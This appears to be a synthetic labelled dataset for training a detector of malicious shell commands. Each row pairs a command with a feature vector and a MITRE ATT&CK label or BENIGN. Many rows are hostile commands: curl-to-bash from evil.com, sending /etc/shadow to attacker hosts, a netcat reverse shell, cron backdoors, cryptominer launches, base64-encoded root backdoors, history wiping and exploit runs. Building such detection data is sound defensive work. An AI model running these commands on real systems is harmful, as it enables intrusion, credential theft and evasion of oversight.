sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
crontab  -e  ;  history  -c,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
python3 exploit.py --target localhost && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup df -h &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'c3VkbyAtdSB3d3ctZGF0YSBiYXNo' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
time systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent group sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nohup whoami /all &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
lsb_release  -a  |  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
psexec.py  Administrator:password@10.0.0.5  cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""echo 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MA==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
time uname -a && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -A -T4 192.168.1.0/24 && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'bm1hcCAtc24gMTkyLjE2OC4xLjAvMjQ=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
wget -q https://example.com/file.tar.gz,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
cat /etc/shadow,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
du -sh /var/log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
time echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
ip neigh show | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.4, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup uptime &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""pip install requests""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
net user /domain | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
tar -czf backup.tar.gz /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
smbclient //10.0.0.5/C$ -U Administrator && history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nohup pip install requests &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3  -c  ""import  subprocess;  subprocess.run(['cat','/etc/shadow'])""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time tar -czf backup.tar.gz /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
crontab -e ; history -c,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""useradd -m -s /bin/bash hacker""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
useradd  -m  -s  /bin/bash  hacker  ;  sleep  1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 && sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'YXJwIC1hIHwgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time ./pwnkit | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
> ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHN1YnByb2Nlc3M7IHN1YnByb2Nlc3MucnVuKFsnY2F0JywnL2V0Yy9zaGFkb3cnXSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
unset  HISTFILE;  export  HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
"bash -c ""echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & && chmod +x /tmp/payload,"[0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 1]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cGFzc3dkIC1kIHJvb3QgJiYgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ifconfig  -a  ;  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in && history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup echo 'cGVybCAtZSAnZXZhbCBwYWNrIHEvSCovLCBxLzczNjM3MjY5NzA3NDJlNjU3MDczMmY1MjY1NmQ2Zjc0NjUyZTcwNmU2Ny8nIDsgaGlzdG9yeSAtYw==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'aGVsbG8=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'bm1hcCAtQSAtVDQgMTkyLjE2OC4xLjAvMjQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""cat /etc/passwd | grep -v nologin | grep -v false""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.48, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
sh  -c  'curl  http://evil.com/shell.sh  |  bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""curl -s http://c2.attacker.com/beacon | chmod +x /tmp/payload""","[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
find  /home  -name  '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
ssh admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo echo 'Li9wd25raXQgOyBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'YXJwLXNjYW4gLS1sb2NhbG5ldA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup getent passwd | grep -v nologin &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
wget  -q  https://example.com/file.tar.gz,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'c2hyZWQgLXUgL3Zhci9sb2cvYXV0aC5sb2c=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
"sudo runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' | echo done","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/hostname,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"time ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' | history -c","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
time wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykpICYmIHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlciA7IHNsZWVwIDE=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443 &,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 1]",['T1496_Resource_Hijacking'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""getent group sudo""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'cGVybCAtZSAnZXZhbCBwYWNrIHEvSCovLCBxLzczNjM3MjY5NzA3NDJlNjU3MDczMmY1MjY1NmQ2Zjc0NjUyZTcwNmU2Ny8nIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZSA7IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
xfreerdp  /u:Administrator  /p:Password123  /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
time history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
"bash -c ""nc -e /bin/bash attacker.com 80""","[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sh  -c  'curl  http://evil.com/shell.sh  |  bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
